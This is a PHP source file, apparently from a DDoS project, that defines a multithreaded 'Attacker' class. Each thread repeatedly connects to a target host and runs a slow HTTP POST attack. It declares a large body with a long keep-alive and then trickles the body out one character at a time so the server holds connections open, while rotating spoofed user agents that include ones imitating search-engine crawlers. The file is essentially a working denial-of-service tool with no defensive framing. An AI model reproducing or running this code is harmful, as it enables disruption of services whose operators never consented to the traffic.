<?php
namespace yxmingy\ddos;
require "Socket/socket_h.php";
class Attacker extends \Thread
{
  protected static $useragents = [
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
    "Googlebot/2.1 (http://www.googlebot.com/bot.html)",
    "Opera/9.20 (Windows NT 6.0; U; en)",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
    "Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
    "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
    "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)", // maybe not
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13",
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
    "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)"
  ];
  protected $id;
  protected $host;
  protected $port;
  protected $running;
  protected $chars;
  public function __construct(string $host,int $port,int $id)
  {
    $this->id = $id;
    $this->host = $host;
    $this->port = $port;
    $this->running = true;
    $this->chars = basic_chars();
  }
  public function shutdown()
  {
    $this->running = false;
  }
  public function run()
  {
    println("Attacker No.".$this->id." is started.");
    while($this->running) {
      $this->post();
    }
  }
  protected function post()
  {
    try {
      $sock = new \yxmingy\ClientSocket();
      $sock->connect($this->host,$this->port);
      $agent = self::$useragents[mt_rand(0,count(self::$useragents))];
      $sock->write("POST / HTTP/1.1\r\n".
                   "Host: ".$this->host."\r\n".
                   "User-Agent: ".$agent."\r\n".
                   "Connection: keep-alive\r\n".
                   "Keep-Alive: 900\r\n".
                   "Content-Length: 100000\r\n".
                   "Content-Type: application/x-www-form-urlencoded\r\n\r\n");
      //println("")
      $i = $s = 0;
      $c = count($this->chars);
      $err = 0;
      while(($i++)<99999) {
        $a = $sock->write($this->chars[$s++]);
	if($a === null) {
	  $err++;
	  println("No.".$this->id." post $i Fail");
	  if($err>3) {
            println("No.".$this->id." connect closd. Reconnecting...");
	    break;
	  }
	}
        if($s==$c)
          $s = 0;
      }
      $sock->close();
    }catch(\Exception $e) {
      echo $e;
    }
  }
}
